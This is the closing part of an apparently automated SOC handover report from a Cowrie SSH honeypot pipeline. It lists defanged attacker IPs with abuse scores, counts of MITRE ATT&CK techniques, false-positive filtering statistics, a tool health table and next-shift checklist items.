| `101.230.144[.]128` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 6 |
| `143.244.170[.]161` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `94.101.54[.]97` | IT | Convergenze S.p.A. | **100** ⚠️ | 35 |
| `66.132.186[.]192` | US | Censys, Inc. | **100** ⚠️ | 45 |
| `207.180.229[.]239` | FR | Contabo GmbH | **100** ⚠️ | 50 |
| `41.216.178[.]69` | ID | Atha media prima | **100** ⚠️ | 7 |
| `66.132.195[.]83` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `115.190.119[.]177` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 23 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 37 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (88 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 9 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 14 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 59 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 487 cases |
| Tool 34  | Credential Extractor        | ✅ 63 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 55 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 88 filtered (18.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 34 recon entry/entries in table (14 group(s) consolidating 356 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-21T09:50:11Z_
